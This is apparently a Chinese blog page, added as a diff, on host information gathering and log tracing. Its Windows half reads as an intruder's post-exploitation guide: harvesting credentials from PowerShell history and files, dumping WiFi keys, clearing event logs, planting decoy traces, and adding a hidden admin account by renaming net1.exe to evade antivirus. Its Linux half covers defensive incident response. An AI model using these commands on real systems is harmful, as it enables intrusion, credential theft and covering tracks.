@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="蓝队日志溯源"><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>蓝队日志溯源 | Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  hexoVersion: '5.2.0'
+} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windwos%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">windwos主机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">Windows主机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">powershell命令历史记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E5%AF%BB%E6%89%BE"><span class="toc-number">1.1.2.</span> <span class="toc-text">敏感文件寻找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.3.</span> <span class="toc-text">域信息收集常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.4.</span> <span class="toc-text">其它补充</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">linux主机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.0.1.</span> <span class="toc-text">网络信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%94%B6%E9%9B%86"><span class="toc-number">2.0.2.</span> <span class="toc-text">敏感文件收集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A1%A5%E5%85%85"><span class="toc-number">2.1.</span> <span class="toc-text">其他补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#history%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">history命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.</span> <span class="toc-text">日志相关命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%9F%A5"><span class="toc-number">2.2.</span> <span class="toc-text">进程和端口检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc"><span class="toc-number">2.3.</span> <span class="toc-text">proc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#history%E4%BF%A1%E6%81%AF%E6%A3%80%E6%9F%A5"><span class="toc-number">2.4.</span> <span class="toc-text">history信息检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E5%88%86%E6%9E%90"><span class="toc-number">2.5.</span> <span class="toc-text">主机服务分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%86%E6%9E%90"><span class="toc-number">2.6.</span> <span class="toc-text">定时任务分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BCPU%E8%BF%90%E8%A1%8C"><span class="toc-number">2.7.</span> <span class="toc-text">查看CPU运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%A7%98%E9%92%A5%E5%88%86%E6%9E%90"><span class="toc-number">2.8.</span> <span class="toc-text">ssh秘钥分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.9.</span> <span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.10.</span> <span class="toc-text">主机日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.11.</span> <span class="toc-text">web日志分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9"><span class="toc-number"></span> <span class="toc-text">杂项</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#grep%E6%8C%87%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">grep指令</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">182</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">蓝队日志溯源</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-12-03</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="windwos主机信息收集"><a href="#windwos主机信息收集" class="headerlink" title="windwos主机信息收集"></a>windwos主机信息收集</h2><h3 id="Windows主机信息收集"><a href="#Windows主机信息收集" class="headerlink" title="Windows主机信息收集"></a>Windows主机信息收集</h3><h4 id="powershell命令历史记录"><a href="#powershell命令历史记录" class="headerlink" title="powershell命令历史记录"></a><strong>powershell命令历史记录</strong></h4><p>可以使用powershell进行查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell Get-Content (Get-PSReadlineOption).HistorySavePath</span><br></pre></td></tr></table></figure>
+
+<p>某些情况下，该命令可能无法使用，我们可先用dir查看powershell历史命令记录文件的存放位置，然后使用type进行读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">%appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<p>PS：打点时遇到Windows环境的文件下载漏洞，可下载以下文件进行敏感信息翻阅，某些运维会使用powershell进行管理工作组或域内机器，运气好的可以找到ssh、数据库这类登录密码或其它重要文件，尤其是一些运维用的脚本，里面大多包含主机、数据库登录密码，可通过powershell历史记录找到这些脚本的绝对路径，然后在使用文件下载漏洞进行读取，这也是一个不错的突破点，而且这些历史命令大多包含链接主机信息，可提取里面的IP段，扩宽我们的攻击面。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<p>渗透结束时，如果使用过powershell的，务必清除powershell命令历史记录，在一定程度上可以减少被溯源成功的概率，当然，也可以迷惑蓝队，写入一些奇怪的命令，例如把上线的C2地址更改为境外的已公开IOC情报的挖矿IP，然后丢进来几个挖坑样本，误导蓝队进行溯源消耗防守方的精力，伪造痕迹的时候记得更改文件时间，还得注意下语言文字这些细节，不然蓝队看到中文名字、错误语法和时间的挖矿，结合攻防演练时间，第一时间肯定会知道这是伪造出来的，如果内网存在IDS这样的流量审计设备，蓝队一定位机器查看设备流量，说不定还可能暴露我们的踪迹</p>
+<p>这目录里面放着电脑的历史打开文件记录，看过什么文件、什么时候，包括点过那几个盘，都很详细的记录，我们可通过该目录定位运维常用的文件夹、文件等，寻找敏感信息，查看这个目录往往有奇效，很多时候运维为了方便管理机器喜欢用密码小本本来记录各个机器的密码，毕竟一个运维管理几十台机器是非常常见，这么多密码不一定记得住，所以大多数运维会选择把机器密码记录在txt、xls这种文件里，这也就给了我们可乘之机，其实我在这个目录遇到最多的还是运维写的日报、周报，很多时候这些报告里面包含了大量服务器信息，这时候我们就可以通过这些敏感信息进一步内网横向。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">recent</span><br></pre></td></tr></table></figure>
+
+<p>大多数时候我们的起点都是webshell权限，如果没有判断管理员是否在线，是否有IDS这种流量检测设备，那么在第一时间最好不要冒然远程过去，不然就是得不偿失了；recent无法使用，这时候我们可以使用dir读取历史打开文件，然后再利用dir搜索关键字得到文件的绝对路径，这样我们就可以直接在webshell中进行查看或下载回来本地打开了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir %APPDATA%\Microsoft\Windows\Recent</span><br><span class="line">dir C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b c:\password.txt</span><br></pre></td></tr></table></figure>
+
+<p>其它的常用关键字搜索，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;a &#x2F;s &#x2F;b c:\*.conf *.ini *.inc *.config </span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b c:\conf.* config.* </span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b c:\*.txt *.xls *.xlsx *.docx</span><br><span class="line">findstr &#x2F;s &#x2F;i &#x2F;n &#x2F;d:C:\ &#x2F;c:&quot;pass&quot; *.config</span><br></pre></td></tr></table></figure>
+
+<p>某些时候显示内容过多，可对这些关键字进行逐个搜索，或使用findstr进行过滤，如:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;a &#x2F;s &#x2F;b c:\*.conf *.ini *.inc *.config | findstr &quot;运维&quot;</span><br><span class="line">dir &#x2F;a &#x2F;s &#x2F;b c:\*.txt *.xls *.xlsx *.docx | findstr &quot;密码&quot;</span><br></pre></td></tr></table></figure>
+
+<p>另外可到回收站翻翻，很多时候会有惊喜。</p>
+<p>前面说到了recent目录记录到了查看历史打开文件，在后渗透时，我们通常会往目标机子上传各种文件，例如nps、mimikatz、psexec等，这些工具在使用过程中，大多会在recent目录产生记录，这时候为了更好的隐藏痕迹，我们可以rd命令删除运行记录或直接使用CS或webshell管理工具提供的文件管理功能删除该记录，另外psexec成功登录退出后，会在目标机器的安全日志中产生Event 4624、4628、4634，在系统日志中产生Event 7045（记录PSEXESVC安装）、Event 7036（记录PSEXESVC服务状态），Windows日志也需要处理下；关于清理痕迹不是本文的主题，就不多赘述了，对于应急的同学可以多关注下recent文件夹和Windows日志，在不手动清理或者使用某些安全工具清理垃圾的时候，recent这个目录为空或者很少东西，那么应该要注意下了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rd &#x2F;s 文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>windows 日志路径：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx</span><br><span class="line">安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br><span class="line">应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br><span class="line">日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</span><br><span class="line">IIS默认日志位置：%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span><br></pre></td></tr></table></figure>
+
+<p><strong>powershell清除Windows事件日志</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PS：上传后的文件如果不能删除（没权限或其它因素），那么可以上传或新建同名文件，覆盖掉原有文件。</p>
+<h4 id="敏感文件寻找"><a href="#敏感文件寻找" class="headerlink" title="敏感文件寻找"></a>敏感文件寻找</h4><ul>
+<li>服务器、中间件、数据库这类配置文件。</li>
+<li>运维密码、工作记录、个人记录这些。</li>
+<li>公司文件、合同、网络拓扑图这类。</li>
+<li>……</li>
+</ul>
+<p>服务器、中间件、数据库这类配置文件的重要性大家都懂，渗透的时候如果获取到一个包含大量敏感信息的配置文件，那将会为我们在后渗透作出良好的铺垫，如下。</p>
+<p>某次项目时，拿到一个存在内网的shell，通过对主机信息收集，发现某配置文件Config-back.xml包含了大量的数据库账号密码，之后使用CS下载该配置文件到本地，然后搭建代理利用这些账号密码批量上线MSSQL主机，再结合这些密码制作出高质量字典爆破C段机器，用了不到30分钟拿到了200多台机器权限，所以说渗透的本质是信息搜集，信息搜集的量决定着我们渗透的成果，关于配置文件的查找这里就不多说了，可参考上面的dir命令进行查找。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;a &#x2F;s &#x2F;b d:\conf.* config.*</span><br></pre></td></tr></table></figure>
+
+<p>另外就是要多关注下web系统本身存放的文件，之前遇到过一个IBM系统，里面有个云盘功能，之后翻这个功能模块找到了个运维建立的文件夹，里面存放了大量的数据，什么网络拓扑图、运维日志、甚至还有账号密码，还有的就是做等保渗透的时候，远程到运维机，桌面一大堆设备清单，还有各个系统的账号密码，而且这些xlsx表格都是不加密的，直接打开就能查看，一些运维为了贪图方便，往往会非常严重的安全隐患，给了入侵者很大的机会。</p>
+<p>这里再补充一下WiFi密码获取这个点，在内网渗透，密码获取到的越多，路就越好走，很多时候内网的密码都是通用的，就算是不通用，大部分的密码也是有规律可循的，关于密码的获取可使用<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>。</p>
+<p><strong>CMD获取WiFi密码</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles</span><br><span class="line">netsh wlan show profiles name&#x3D;&quot;WiFi名称&quot; key&#x3D;clear</span><br><span class="line"></span><br><span class="line">通过for循环一次性获取全部WiFi密码</span><br><span class="line">for &#x2F;f &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key&#x3D;clear</span><br></pre></td></tr></table></figure>
+
+<p>如果已经取得当前机器的管理员权限的话，可运行mimikatz、procdump之类凭据获取工具获取系统凭据，因为多数管理员可能使用同一密码或有规律性的密码来管理多台服务器，如果能够得到主机密码或者hash就可以尝试pth或psexec批量上线了；还有就是在进程收集的时候要多留意一下是否有域管启用的进程，如果刚好域管理员登录过我们已经有权限的机器，那么就可以利用域管进程进行横向了，如果没有的话可关注下ms14068，域委派这类东西，这些都是后渗透基本常识了，这里不多赘述。</p>
+<h4 id="域信息收集常用命令"><a href="#域信息收集常用命令" class="headerlink" title="域信息收集常用命令"></a>域信息收集常用命令</h4><p><strong>常用命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use  查看ipc连接情况</span><br><span class="line">net user &#x2F;domain 获取域用户列表</span><br><span class="line">net user test 123 &#x2F;add 添加用户</span><br><span class="line">neet localgroup administrators test &#x2F;add 添加test用户到管理组，一般情况下，管理组才能远程桌面</span><br><span class="line">net group &#x2F;domain 查询域里面的组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain 获取域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain   查看当前域中企业管理员组用户</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain    查看当前域中的所有的计算机名（登录过该域的计算机）</span><br><span class="line">net group &quot;exchange servers&quot; &#x2F;domain    查看域内是否存在Exchange</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain 查看域控制器(如果有多台)</span><br><span class="line">net config workstation  查看当前登录域</span><br><span class="line">net view 查看同一域内机器列表</span><br><span class="line">net view \\ip 查看某IP共享</span><br><span class="line">net view \\test 查看test计算机的共享资源列表</span><br><span class="line">net view &#x2F;domain 查看内网存在多少个域</span><br><span class="line">Net view &#x2F;domain:test 查看test域中的机器列表</span><br><span class="line">wmic useraccount get Caption,sid    获取域内所有用户sid</span><br><span class="line">setspn -T target.com -Q *&#x2F;*     获取当前域内所有spn</span><br><span class="line">for &#x2F;l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find &#x2F;i&quot;ttl&quot;</span><br><span class="line">for &#x2F;l %i in (1,1,255) do @ping 10.10.10.%i -w 1 -n 1 | find &#x2F;i&quot;ttl&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>网络信息查找</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all   查看当前主机的主机名&#x2F;IP&#x2F;DNS等信息</span><br><span class="line">route print 查看路由表信息</span><br><span class="line">netstat -ano    查看端口开放情况，有些时候能获取到别的IP段</span><br><span class="line">arp -a  查看arp解析情况</span><br></pre></td></tr></table></figure>
+
+<p>寻找内网网段时建议被动寻找，主动寻找动静太大，如nmap、nbtscan这种一扫，可能整个网段内存活的机器就出来了，但随之而来的是IDS的流量审计，一旦引起流量异常被蓝队察觉，可能就会导致我们权限的丢失，永远不要小瞧蓝队，而且还是拥有各种安全设备的蓝队，内网渗透一定要谨慎，大规模资产扫描，自动化漏洞扫描我一般会留到最后才上的。</p>
+<p><strong>定位域控</strong></p>
+<p>查看域时间，一般域控会做时间服务器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p>通过dns定位域控</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;allipconfig &#x2F;displaydns   有些时候可以在dns缓存得到域控信息</span><br></pre></td></tr></table></figure>
+
+<p>利用netdom获取域控列表，得到域控名称可通过ping获取域控IP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdom query dc</span><br></pre></td></tr></table></figure>
+
+<p><strong>其它信息查找</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo  查看补丁情况，也能看到当前机器是否加入域环境</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain  查询域控</span><br><span class="line">nslookup -type&#x3D;SRV _ldap._tcp.corp  通过srv记录获取域控地址</span><br><span class="line">nltest &#x2F;dclist:corp     使用nltest查询域控列表</span><br><span class="line">tasklist &#x2F;svc   查看进程及对应服务名</span><br><span class="line">cmdkey &#x2F;l   查看当前保存的登陆凭证</span><br><span class="line">type c:\Windows\system32\drivers\etc\hosts  可以发现些内网IP</span><br></pre></td></tr></table></figure>
+
+<h4 id="其它补充"><a href="#其它补充" class="headerlink" title="其它补充"></a>其它补充</h4><p><strong>web日志</strong></p>
+<p>有些老系统会使用get+明文的方式传输后台登录账号密码，我们可翻查下web日志，说不定有收获，还有就是要注意系统本身的日志，这些日志大多包含内网IP段，甚至还有账号密码这些东西。</p>
+<p><strong>使用net1.exe绕过杀软添加用户</strong></p>
+<p>windows环境渗透添加用户往往会被AV拦截，而且还会产生告警日志，这时候可使用net1.exe绕过杀软添加用户，当然，也可使用cs自带的argue参数污染进行用户添加。</p>
+<p><strong>net1.exe</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd c:&#x2F;windows&#x2F;system32</span><br><span class="line">copy net1.exe svchost.txt</span><br><span class="line">svchost.txt user svchost  M@Bas#as#@123 &#x2F;add</span><br><span class="line">net localgroup administrators svchost &#x2F;add</span><br><span class="line">svchost.txt user svchost  M@Bas#as#@123 &#x2F;add &amp; net localgroup administrators svchost &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<p><strong>argue参数污染</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net1 argue net1 aaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssssssssssssssssss</span><br><span class="line">execute net1 user svchost M@Bas#as#@123 &#x2F;add</span><br><span class="line">execute net1 localgroup administrators svchost &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<p>正常使用net添加用户会被火绒拦截</p>
+<p>添加用户并加到管理员组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m1kh.txt user m1kh  M@Bas#as#@123 &#x2F;add &amp; net localgroup administrators m1kh &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<h2 id="linux主机信息收集"><a href="#linux主机信息收集" class="headerlink" title="linux主机信息收集"></a>linux主机信息收集</h2><h4 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">last                                    多数运维会接入内网登录系统，这时候，便可获取部分内网ip 进而对内网IP段进行画像</span><br><span class="line">Ifconfig -a&#x2F;arp -a&#x2F;netstat -anopt&#x2F;ss -nt          这些就不多说了</span><br><span class="line">Route -n                                内网路由情况，也能为内网网络拓扑提供一定的信息</span><br><span class="line">IPtables                                防火墙情况，有时候会存在内网网络通行规则，也能提供一定信息</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<h4 id="敏感文件收集"><a href="#敏感文件收集" class="headerlink" title="敏感文件收集"></a>敏感文件收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;password:&quot; * -Rn</span><br><span class="line">find &#x2F; -name &quot;config.*&quot;</span><br><span class="line">find &#x2F; -name &quot;databases.*&quot;</span><br><span class="line">find &#x2F; -name &quot;config.*&quot; | xargs grep &quot;password&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><h4 id="history命令"><a href="#history命令" class="headerlink" title="history命令"></a>history命令</h4><p>history 在linux渗透时是非常实用的，各种连接密码，ssh、mysql、ftp等等，在拿到权限是应该着重看看这个文件</p>
+<h4 id="日志相关命令"><a href="#日志相关命令" class="headerlink" title="日志相关命令"></a>日志相关命令</h4><p>last命令记录着所有用户登录系统的日志，可以用来查找非授权用户的登录事件，而last命令的输出结果来源于/var/log/wtmp文件，稍有经验的入侵者都会删掉/var/log/wtmp以清除自己行踪，但是还是会露出蛛丝马迹在此文件中的。</p>
+<p>可用以下命令分析用户登录行为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">who                     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w                       查看某一时刻用户的行为</span><br><span class="line">uptime                  查看有多少用户，以此确定是否存在异常用户</span><br><span class="line">lastb                   显示登录失败次数，判断是存在ssh爆破</span><br><span class="line">last                    显示用户最近登录信息。</span><br><span class="line">lastlog                 登录成功记录</span><br></pre></td></tr></table></figure>
+
+<h3 id="进程和端口检查"><a href="#进程和端口检查" class="headerlink" title="进程和端口检查"></a>进程和端口检查</h3><p><strong>进程检查</strong></p>
+<p>用ps命令查看服务器上的所有进程，定位恶意进程。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -a               列出的是当前控制终端启动的进程</span><br><span class="line">ps -A               系统全部启动进程</span><br><span class="line">ps auxf             查看父进程关联的子进程</span><br><span class="line">pstree              查看进程树</span><br></pre></td></tr></table></figure>
+
+<p>进程过多的话也可以用命令：ps -aux | grep 进程名 定位到恶意程序</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -aux | grep 进程名</span><br></pre></td></tr></table></figure>
+
+<h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><p>这里简要说一下proc：</p>
+<p>/proc 是一个伪文件系统，这个伪文件系统让你可以和内核内部数据结构进行交互，与真正的文件系统不同的是它是存在于内存中而不是真正的硬盘上，所以重启后/proc会被重置掉，linux 下有一个说法即一切皆文件，所有在linux上运行的程序都在/proc下有一个自己的目录，目录名字为程序的Pid号，目录里面存储着许多关于进程的信息，列如进程状态status，进程启动时的相关命令cmdline，进程的内存映像maps，进程包含的所有相关的文件描述符fd文件夹等等<br>其中 /proc/pid/fd 中包含着进程打开的所有文件的文件描述符，这些文件描述符看起来像链接文件一样，通过ls -l 你可以看见这些文件的具体位置，但是它们并不是简单连接文件，你可以通过这些文件描述符再打开这些文件，你可以重新获得一个新的文件描述符，即使这些文件在你所在的位置是不能访问，你依然可以打开。 还一个 /proc/pid/exe 文件，这个文件指向进程本身的可执行文件。</p>
+<p>所以在得到PID后，我们就能利用以下命令获取该PID所对应的进程文件路径，获取进程的详细信息了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;proc&#x2F;$PID&#x2F;exe</span><br><span class="line">file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的pid 号）</span><br><span class="line">which name                                          查看程序在哪个文件夹 name表示程序名</span><br><span class="line">lsof &#x2F;usr&#x2F;bin&#x2F;*                                     查看某个路径下的运行中的进程列表</span><br><span class="line">pidof &#x2F;usr&#x2F;bin&#x2F;*   </span><br></pre></td></tr></table></figure>
+
+<h3 id="history信息检查"><a href="#history信息检查" class="headerlink" title="history信息检查"></a>history信息检查</h3><p>攻击者入侵后，往往会顺手把历史操作命令给清除掉（history -c），但此命令并不会清除保存在文件中的记录，因此打开/home各帐号目录下的.bash_history，查看每个用户目录下的.bash_history文件，特别是/root目录下的.bash_history文件，此文件中记录着用户执行的所有历史命令，很多时候攻击者会通过wget下载恶意木马到服务器，这时候查看history说不定就能捕获攻击者的C2服务器了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">cat &#x2F;root&#x2F;.bash_history &gt; root_history.txt</span><br><span class="line">history -w</span><br></pre></td></tr></table></figure>
+
+<p>history优化</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1. 保存1万条命令</span><br><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">2. 在&#x2F;etc&#x2F;profile的文件尾部添加如下行数配置信息：</span><br><span class="line">##history优化</span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&quot;%F %T $USER_IP &#96;whoami&#96; &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND&#x3D;&quot;history -a&quot;</span><br><span class="line"></span><br><span class="line">3. source &#x2F;etc&#x2F;profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 329  2021-04-14 16:39:43 183.6.56.66 root cat &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
+
